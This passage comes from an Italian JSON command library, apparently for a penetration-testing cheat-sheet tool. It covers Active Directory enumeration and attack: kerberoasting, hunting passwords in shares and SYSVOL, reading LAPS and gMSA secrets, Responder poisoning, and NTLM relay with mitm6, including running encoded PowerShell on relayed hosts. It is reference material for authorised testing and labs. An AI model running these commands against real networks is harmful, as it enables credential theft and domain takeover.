      {
        "id": "default",
        "label": "Tutti i gruppi",
        "template": "Get-DomainGroup | select name,distinguishedname | sort name",
        "description": "Elenco completo dei gruppi del dominio."
      },
      {
        "id": "members",
        "label": "Membri (ricorsivo)",
        "template": "Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse | select MemberName",
        "description": "Membri effettivi di un gruppo privilegiato, gruppi annidati inclusi."
      },
      {
        "id": "local",
        "label": "Admin locali remoti",
        "template": "Get-NetLocalGroupMember -ComputerName <computer> -GroupName Administrators | select MemberName",
        "description": "Membri del gruppo Administrators locale di una macchina (serve accesso)."
      }
    ]
  },
  {
    "id": "pv-computers",
    "name": "PowerView — computer & delega",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Mappa i computer del dominio (OS, hostname) e individua le deleghe Kerberos: unconstrained e constrained sono percorsi diretti verso il DC o account privilegiati.",
    "note": "# Output atteso\nLista di computer con OS; macchine con TrustedForDelegation o msds-allowedtodelegateto valorizzati.\n# Interpretazione\nUn computer unconstrained cattura i TGT di chi vi si autentica (incluso un DC se coercizzato). Constrained limita ai servizi elencati.\n# Errori comuni\nI computer spenti falsano i conteggi: `-Ping` filtra solo i vivi.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "computers",
      "delegation",
      "enum"
    ],
    "template": "# computer vivi con OS e hostname\nGet-DomainComputer -Ping -Properties OperatingSystem,DnsHostName | sort DnsHostName\n\n# delega NON vincolata (unconstrained)\nGet-DomainComputer -Unconstrained | select name,dnshostname\n\n# delega vincolata (constrained)\nGet-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Computer",
        "template": "Get-DomainComputer -Ping -Properties OperatingSystem,DnsHostName | sort DnsHostName",
        "description": "Computer vivi con sistema operativo."
      },
      {
        "id": "unconstrained",
        "label": "Unconstrained",
        "template": "Get-DomainComputer -Unconstrained | select name,dnshostname",
        "description": "Macchine con delega non vincolata."
      },
      {
        "id": "constrained",
        "label": "Constrained",
        "template": "Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto",
        "description": "Macchine con delega vincolata e servizi autorizzati."
      }
    ]
  },
  {
    "id": "pv-shares",
    "name": "PowerView — share & file",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Trova le share raggiungibili nel dominio con accesso verificato e vi cerca file sensibili (password, config, script). Spesso la via più rapida a credenziali in chiaro.",
    "note": "# Interpretazione\nUna share con `password`/`config`/`.xml` leggibili è un finding ad alta priorità: vai a leggere subito.\n# Errori comuni\nSenza `-CheckShareAccess` elenca anche share non accessibili, generando rumore inutile.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "powerview",
      "shares",
      "pillaging",
      "enum"
    ],
    "template": "# share raggiungibili (accesso verificato)\nFind-DomainShare -CheckShareAccess\n\n# file interessanti nelle share accessibili\nFind-InterestingDomainShareFile -Include *pass*,*cred*,*.config,*.xml",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Share accessibili",
        "template": "Find-DomainShare -CheckShareAccess",
        "description": "Share del dominio su cui l’utente corrente ha accesso."
      },
      {
        "id": "files",
        "label": "File sensibili",
        "template": "Find-InterestingDomainShareFile -Include *pass*,*cred*,*.config,*.xml",
        "description": "Caccia a file con password/config nelle share."
      }
    ]
  },
  {
    "id": "pv-gpo-ou",
    "name": "PowerView — GPO & OU",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Enumera GPO e OU e, soprattutto, i GPO che modificano i gruppi locali (Restricted Groups / GPP): dicono dove un principale ottiene admin locale su interi insiemi di macchine.",
    "note": "# Interpretazione\nUn GPO che aggiunge un gruppo che controlli ad Administrators su una OU di server = admin locale su tutti quei server.\n# Errori comuni\nNon fermarti all’elenco GPO: il valore è nel mapping GPO, gruppo locale, computer.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "gpo",
      "ou",
      "enum"
    ],
    "template": "# tutti i GPO\nGet-DomainGPO | select displayname,distinguishedname\n\n# OU del dominio\nGet-DomainOU -Properties name | sort name\n\n# GPO che toccano gruppi locali (Restricted Groups / GPP)\nGet-DomainGPOLocalGroup | select GPODisplayName,GroupName",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "GPO",
        "template": "Get-DomainGPO | select displayname,distinguishedname | sort displayname",
        "description": "Elenco dei Group Policy Object."
      },
      {
        "id": "ou",
        "label": "OU",
        "template": "Get-DomainOU -Properties name | sort name",
        "description": "Organizational Unit del dominio."
      },
      {
        "id": "localgroup",
        "label": "GPO, gruppi locali",
        "template": "Get-DomainGPOLocalGroup | select GPODisplayName,GroupName,GroupMembers",
        "description": "GPO che impostano l’appartenenza a gruppi locali."
      }
    ]
  },
  {
    "id": "pv-trust",
    "name": "PowerView — trust",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "PowerView",
    "description": "Enumera i trust del dominio e mappa ricorsivamente quelli del forest. I trust aprono percorsi oltre il dominio compromesso (child, parent, cross-forest).",
    "note": "# Interpretazione\nUn trust intra-forest parent e child abilita l’escalation via SID History/ExtraSids. Un trust cross-forest va valutato per direzione e transitività.\n# Errori comuni\nFermarsi al dominio corrente: `Get-DomainTrustMapping` segue la catena e rivela domini non ovvi.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "powerview",
      "trust",
      "forest",
      "enum"
    ],
    "template": "# trust del dominio corrente\nGet-DomainTrust\n\n# mapping ricorsivo di tutti i trust del forest\nGet-DomainTrustMapping",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Trust dominio",
        "template": "Get-DomainTrust",
        "description": "Trust diretti del dominio corrente."
      },
      {
        "id": "mapping",
        "label": "Mapping forest",
        "template": "Get-DomainTrustMapping",
        "description": "Catena ricorsiva di tutti i trust raggiungibili."
      }
    ]
  },
  {
    "id": "ad-module",
    "name": "AD Module — enum AD (Windows)",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "AD Module",
    "description": "Enumerazione con il modulo ActiveDirectory di Microsoft (RSAT). È firmato e passa dove PowerView viene bloccato (AppLocker, Constrained Language Mode). Stessi target, cmdlet native.",
    "note": "# Quando usarlo\nQuando PowerView non gira per policy di esecuzione o AppLocker: `Get-AD*` è Microsoft-signed. Caricabile anche via DLL senza installare RSAT (`Import-Module.\\Microsoft.ActiveDirectory.Management.dll`).\n# Interpretazione\n`ServicePrincipalName` valorizzato = Kerberoastable; `Description` con password = quick win.",
    "platform": "windows",
    "requires": [
      "shell"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ad-module",
      "powershell",
      "rsat",
      "enum"
    ],
    "template": "# dominio e DC\nGet-ADDomain; Get-ADDomainController\n\n# utenti con SPN (Kerberoast) e description sospetta\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\nGet-ADUser -Filter 'Description -like \"*pass*\"' -Properties Description | select Name,Description\n\n# membri di un gruppo privilegiato\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Dominio",
        "template": "Get-ADDomain; Get-ADDomainController",
        "description": "Info dominio e domain controller."
      },
      {
        "id": "spn",
        "label": "SPN (Kerberoast)",
        "template": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName",
        "description": "Account con SPN, candidati Kerberoasting."
      },
      {
        "id": "desc",
        "label": "Description",
        "template": "Get-ADUser -Filter 'Description -like \"*pass*\"' -Properties Description | select Name,Description",
        "description": "Password lasciate nel campo description."
      }
    ]
  },
  {
    "id": "nxc-ad-enum",
    "name": "nxc ldap — enum dominio",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Enumera il dominio in un colpo: utenti, gruppi e password policy. `--asreproast`/`--kerberoasting` estraggono gli hash direttamente. La variante `desc` pesca le password lasciate per errore nei campi description/info degli account, un classico dei lab.",
    "note": "# Quale variante usare\nUn colpo solo: utenti, gruppi, policy. --asreproast e --kerberoasting estraggono gli hash al volo; la variante che legge il campo description pesca password lasciate lì. Partenza rapida con credenziali valide.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "roasting"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users --groups",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Utenti & gruppi",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users --groups",
        "description": "Elenco utenti e gruppi di dominio."
      },
      {
        "id": "asrep",
        "label": "ASREPRoast",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --asreproast asrep.txt",
        "description": "Estrae gli hash AS-REP degli utenti senza pre-auth."
      },
      {
        "id": "kerb",
        "label": "Kerberoast",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --kerberoasting kerb.txt",
        "description": "Estrae i TGS degli account con SPN."
      },
      {
        "id": "desc",
        "label": "Fishing description/info",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' -M get-desc-users",
        "description": "Legge il campo description di tutti gli utenti cercando password lasciate in chiaro. Alternativa con ldapsearch: `ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'DC=...' '(description=*)' sAMAccountName description info`."
      }
    ]
  },
  {
    "id": "ldapdomaindump",
    "name": "ldapdomaindump — dump HTML",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Dump completo LDAP in HTML/JSON navigabile (utenti, gruppi, computer, policy): comodo per una vista d’insieme offline.",
    "note": "# Cosa osservare\nVista d’insieme offline in HTML/JSON: utenti, gruppi, computer, policy. Apri i file _users e _computers per i campi description e gli OS obsoleti, senza martellare LDAP.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapdomaindump",
      "ldap"
    ],
    "template": "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip> -o ldapdump",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "adidnsdump",
    "name": "adidnsdump — DNS interno via LDAP",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Estrae tutti i record della zona ADIDNS interrogando LDAP: rivela host interni e servizi che non compaiono altrove. Con `-r` risolve anche i record il cui nome non è leggibile direttamente.",
    "note": "# Prossimo passo\nRisolve i nomi host interni che il DNS pubblico non dà: utile per mappare la rete e trovare bersagli. Con -r risolve anche i record non leggibili direttamente. Richiede un account di dominio.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "dns"
    ],
    "tags": [
      "adidnsdump",
      "dns",
      "enumeration"
    ],
    "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dump zona",
        "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip>",
        "description": "Elenca i record DNS del dominio in `records.csv`."
      },
      {
        "id": "resolve",
        "label": "Risolvi nascosti",
        "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip> -r",
        "description": "Prova a risolvere anche i record senza nome leggibile con una query A diretta."
      }
    ],
    "refs": [
      {
        "label": "dirkjanm — adidnsdump",
        "url": "https://github.com/dirkjanm/adidnsdump"
      }
    ]
  },
  {
    "id": "laps-gmsa",
    "name": "LAPS / gMSA — read secrets",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Con il diritto di lettura concesso dall'ACL si ricava la password di amministratore locale gestita da LAPS oppure la password di un gMSA. Spesso è un salto diretto ad amministratore locale o a un account di servizio.",
    "note": "# Prerequisiti\nFunziona solo se un ACL ti concede la lettura dell’attributo (ms-Mcs-AdmPwd per LAPS, msDS-ManagedPassword per gMSA). BloodHound lo segnala come ReadLAPSPassword/ReadGMSAPassword: spesso è un salto diretto ad admin locale o account di servizio.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "laps",
      "gmsa",
      "nxc",
      "loot"
    ],
    "template": "nxc ldap <dc> -u '<user>' -p '<password>' -M laps",
    "params": [
      {
        "key": "dc",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.10"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "computer",
        "label": "Computer",
        "placeholder": "WS01"
      }
    ],
    "variants": [
      {
        "id": "laps",
        "label": "LAPS (nxc)",
        "template": "nxc ldap <dc> -u '<user>' -p '<password>' -M laps",
        "description": "Password admin locale (`ms-Mcs-AdmPwd`) di tutti i computer leggibili. Il modulo sta su `ldap`: il flag `--laps` di `nxc smb` è un’altra cosa, serve ad autenticarsi con la password LAPS, non a leggerla."
      },
      {
        "id": "gmsa",
        "label": "gMSA (nxc)",
        "template": "nxc ldap <dc> -u '<user>' -p '<password>' --gmsa",
        "description": "Password dei gMSA per cui l'account corrente compare in `msDS-GroupMSAMembership`. Richiede LDAPS."
      },
      {
        "id": "bloodyad",
        "label": "LAPS (bloodyAD)",
        "template": "bloodyAD --host <dc> -d <domain> -u <user> -p '<password>' get object '<computer>$' --attr ms-Mcs-AdmPwd",
        "description": "Legge l'attributo LAPS (`ms-Mcs-AdmPwd`) di un computer specifico."
      }
    ]
  },
  {
    "id": "ldapsearch-ad",
    "name": "ldapsearch — enum AD autenticato (Kali)",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Interrogazione LDAP mirata da Kali con credenziali valide: utenti con attributi chiave (SPN, userAccountControl, description) e password policy. Grezzo ma sempre disponibile, non dipende da tool specifici.",
    "note": "# base DN\nDeriva dal dominio: `corp.local`, `DC=corp,DC=local`.\n# Interpretazione\n`userAccountControl` rivela DONT_REQ_PREAUTH (AS-REP), PASSWD_NOTREQD, account disabilitati; `servicePrincipalName` i Kerberoastable.\n# Errori comuni\nSe il bind fallisce con credenziali valide, il DC può richiedere LDAPS (porta 636) o signing: usa `ldaps://`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapsearch",
      "ldap",
      "enum"
    ],
    "template": "# utenti con attributi chiave\nldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(objectClass=user)\" sAMAccountName servicePrincipalName userAccountControl description\n\n# password policy del dominio\nldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b \"<basedn>\" \"(objectClass=domainDNS)\" minPwdLength lockoutThreshold maxPwdAge",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "basedn",
        "label": "Base DN",
        "placeholder": "DC=corp,DC=local"
      }
    ]
  },
  {
    "id": "ldeep",
    "name": "ldeep — enum LDAP completa (Kali)",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "LDAP",
    "description": "Dump LDAP strutturato e navigabile: utenti, gruppi, computer, trust, ACL e GPO in file separati. Alternativa a ldapdomaindump quando serve granularità e filtri mirati.",
    "note": "# Interpretazione\nIl comando all scrive un file per categoria: parti da users_spn (Kerberoast), users_description (password in chiaro) e trusts (percorsi inter-dominio).\n# Errori comuni\nIl base DN viene dedotto dal dominio: se il bind fallisce con credenziali valide il DC può imporre LDAPS, usa ldaps:// al posto di ldap://.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldeep",
      "ldap",
      "enum"
    ],
    "template": "# dump completo in cartella (un file per categoria)\nldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<ip> all ldeep_out\n\n# query mirata: utenti con SPN (kerberoastable)\nldeep ldap -u <user> -p '<password>' -d <domain> -s ldap://<ip> users --filter '(servicePrincipalName=*)'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "smbmap-sysvol",
    "name": "smbmap — caccia GPP in SYSVOL",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "SMB / SYSVOL",
    "description": "Elenca le share con i relativi permessi e scandaglia SYSVOL alla ricerca di Group Policy Preferences con cpassword, decifrabili offline in credenziali valide.",
    "note": "# Interpretazione\nUn Groups.xml (o simili) con cpassword in SYSVOL è una credenziale pronta: la chiave AES e pubblica, quindi la decifri subito (gpp-decrypt).\n# Errori comuni\nSYSVOL e leggibile da ogni utente di dominio: se smbmap non lo vede, controlla di aver passato dominio e credenziali corrette.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbmap",
      "sysvol",
      "gpp",
      "pillaging"
    ],
    "template": "# share con permessi\nsmbmap -u <user> -p '<password>' -d <domain> -H <ip>\n\n# listing ricorsivo di SYSVOL (cerca GPP con cpassword)\nsmbmap -u <user> -p '<password>' -d <domain> -H <ip> -R SYSVOL --dir-only",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ad-recycle-bin",
    "name": "AD Recycle Bin — oggetti eliminati",
    "category": "active-directory",
    "subcategory": "enum-manual",
    "group": "Recycle Bin",
    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra Enrollment Rights per un SID senza nome, ciòè un account cancellato: ripristinandolo il path torna percorribile. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
    "note": "# Prossimo passo\nServe quando un template ADCS mostra Enrollment Rights per un SID senza nome (account cancellato): ripristinandolo il permesso torna utilizzabile. Enumera gli oggetti eliminati e ripristina quello che serve.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "recycle-bin",
      "deleted-objects",
      "tombstone"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Account da ripristinare",
        "placeholder": "old_svc"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (bloodyAD)",
        "template": "# oggetti su cui hai permesso di scrittura: i cancellati ci sono di default (--exclude-del per ometterli)\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable\n\n# ripristina dal cestino di AD l'oggetto scelto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
        "description": "Individua gli oggetti eliminati e ripristina il target, recuperandone tutti i gruppi e i permessi."
      },
      {
        "id": "search",
        "label": "Enum cestino (get search)",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get search --filter '(isDeleted=TRUE)' --attr name,objectSid,memberOf,msDS-LastKnownRDN,lastKnownParent -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065",
        "description": "Elenca il cestino a prescindere dai diritti, mentre `get writable` mostra solo ciò su cui puoi scrivere. `2064` rende visibili gli oggetti cancellati, `2065` riattiva i link disattivati (senza, `memberOf` torna vuoto). `name` è mangled (`old_svc\\0ADEL:<guid>`): il nome vero sta in `msDS-LastKnownRDN`, e `lastKnownParent` è il container che serve a `set restore`."
      },
      {
        "id": "windows",
        "label": "Windows (AD module)",
        "template": "# elenca gli utenti cancellati ancora presenti nel cestino\nGet-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeDeletedObjects -Properties *\n\n# ripristina l'oggetto che corrisponde al nome cercato\nGet-ADObject -Filter {Name -like '<target>'} -IncludeDeletedObjects | Restore-ADObject",
        "description": "Enum e restore da Windows. Serve il diritto `DS-Reanimate-Tombstones`."
      }
    ],
    "refs": [
      {
        "label": "bloodyAD — wiki",
        "url": "https://github.com/CravateRouge/bloodyAD/wiki"
      }
    ]
  },
  {
    "id": "responder",
    "name": "Responder — LLMNR/NBT-NS poisoning",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Poisoning",
    "description": "Avvelena le query di risoluzione nomi LLMNR, NBT-NS e MDNS, protocolli di fallback attivi di default su Windows: quando un host cerca un nome inesistente, Responder risponde spacciandosi per quel nome e cattura il NetNTLMv2 di chi tenta di autenticarsi. Gli hash finiscono in `/usr/share/responder/logs/` e si craccano con hashcat in mode 5600.",
    "note": "# Cattura o relay, non entrambi\nPer usare gli hash in un relay con ntlmrelayx, i server SMB e HTTP di Responder vanno disabilitati in `/etc/responder/Responder.conf`, altrimenti Responder intercetta la connessione destinata al relay.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ntlm"
    ],
    "tags": [
      "responder",
      "llmnr",
      "netntlmv2"
    ],
    "template": "responder -I <iface> -w",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "tun0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Poison",
        "template": "responder -I <iface> -w",
        "description": "Ascolta e avvelena. Per il relay disabilita SMB/HTTP in `Responder.conf`."
      },
      {
        "id": "analyze",
        "label": "Analyze",
        "template": "responder -I <iface> -A",
        "description": "Modalità passiva: osserva senza avvelenare (ricognizione)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — LLMNR/NBT-NS poisoning",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html"
      }
    ]
  },
  {
    "id": "nxc-gen-relay-list",
    "name": "nxc smb — target senza SMB signing",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "NTLM Relay",
    "description": "Enumera la subnet e scrive su file gli host con SMB signing non obbligatorio, gli unici verso cui un relay NTLM può concludersi. Il file prodotto si passa direttamente a ntlmrelayx con -tf. Senza questa selezione il relay fallisce sugli host che impongono la firma, senza un errore esplicito.",
    "note": "# Prossimo passo\nProduce la lista dei soli host senza SMB signing obbligatorio, gli unici bersagli validi per un relay NTLM. Il file si passa a ntlmrelayx con -tf. Senza, si rilancia verso host che rifiutano.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "netexec",
      "relay",
      "signing",
      "ntlm"
    ],
    "template": "nxc smb <subnet> --gen-relay-list targets.txt",
    "params": [
      {
        "key": "subnet",
        "label": "Subnet",
        "placeholder": "10.10.10.0/24"
      },
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Subnet intera",
        "template": "nxc smb <subnet> --gen-relay-list targets.txt",
        "description": "Sweep della subnet: il modo normale di costruire la lista dei bersagli prima di avviare il relay."
      },
      {
        "id": "single",
        "label": "Host singolo",
        "template": "nxc smb <ip> --gen-relay-list targets.txt",
        "description": "Verifica il signing su un solo host, utile per confermare un bersaglio già individuato."
      }
    ],
    "refs": [
      {
        "label": "NetExec — SMB",
        "url": "https://www.netexec.wiki/smb-protocol"
      }
    ]
  },
  {
    "id": "ntlmrelayx-smb",
    "name": "ntlmrelayx — relay SMB",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "NTLM Relay",
    "description": "Rilancia l'autenticazione NTLM catturata verso host che non impongono l'SMB signing, gli unici bersagli validi, ottenuti con `nxc smb <range> --gen-relay-list`. Senza toccare alcun hash, l'autenticazione della vittima viene spesa in tempo reale sul target: `-i` apre una shell SMB interattiva, `-c` esegue un comando singolo.",
    "note": "# Prerequisiti\nI bersagli NON devono imporre SMB signing (lista da nxc --gen-relay-list). Va in coppia con una coercizione (Coercer/PetitPotam) o con LLMNR/mitm6 che forzano l’autenticazione. -i apre una shell SMB, -c esegue un comando.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb",
      "ntlm"
    ],
    "tags": [
      "impacket",
      "ntlmrelayx",
      "relay"
    ],
    "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
    "params": [
      {
        "key": "b64",
        "label": "Payload base64",
        "placeholder": "cG93ZXJzaGVsbC4uLg=="
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Shell interattiva",
        "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -i",
        "description": "Apre una shell SMB sul target relayato (`nc 127.0.0.1 11000`)."
      },
      {
        "id": "exec",
        "label": "Esegui comando",
        "template": "impacket-ntlmrelayx -tf targets.txt -smb2support -c \"powershell -enc <b64>\"",
        "description": "Esegue un comando sul target relayato."
      }
    ]
  },
  {
    "id": "mitm6-relay",
    "name": "mitm6 + ntlmrelayx (IPv6 takeover)",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "NTLM Relay",
    "description": "Avvelena il DNS IPv6 (che Windows preferisce all IPv4) rispondendo alle richieste DHCPv6 come server DNS, poi rilancia l autenticazione NTLM raccolta verso LDAPS del DC. Da zero credenziali a un account macchina con RBCD o a una delega.",
    "note": "# Interpretazione\nOgni host Windows che fa una query IPv6 si autentica verso di te: il relay a LDAPS crea un nuovo account computer e gli concede RBCD, oppure dumpa la directory. Materiale per il takeover senza conoscere alcuna password.\n# Errori comuni\nMolto rumoroso e disturba la rete: in lab va bene, altrove con cautela. Richiede IPv6 non filtrato. Se LDAPS non accetta il relay, prova il dump semplice senza --delegate-access.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ldap",
      "dns"
    ],
    "tags": [
      "mitm6",
      "ntlmrelayx",
      "ipv6",
      "relay",
      "coercion"
    ],
    "template": "# 1. DNS IPv6 malevolo per il dominio\nmitm6 -d <domain>\n\n# 2. in parallelo, relay verso LDAPS del DC\nimpacket-ntlmrelayx -6 -t ldaps://<ip> -wh wpad --delegate-access",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "pre2k",
    "name": "pre2k — account computer pre-creati",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Account pre-creati",
    "description": "I computer account creati con l opzione pre-Windows 2000 hanno come password iniziale il nome dell account stesso in minuscolo (senza il $). Se non è mai stato unito al dominio, quella password è ancora valida: un foothold senza credenziali utente.",
    "note": "# Interpretazione\nUn hit da una credenziale macchina (HOST$) con cui autenticarti e proseguire con enumerazione e roasting. Serve una lista di nomi computer, ricavabile da una null session o da BloodHound.\n# Errori comuni\nFunziona solo su account mai loggati davvero: la maggior parte dei computer attivi ha già cambiato la password al primo avvio.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos",
      "ldap"
    ],
    "tags": [
      "pre2k",
      "computer-account",
      "kerberos"
    ],
    "template": "# verifica quali computer pre-creati hanno ancora la password di default\npre2k unauth -d <domain> -dc-ip <ip> -inputfile computers.txt",
    "params": [
      {
        "key": "domain",
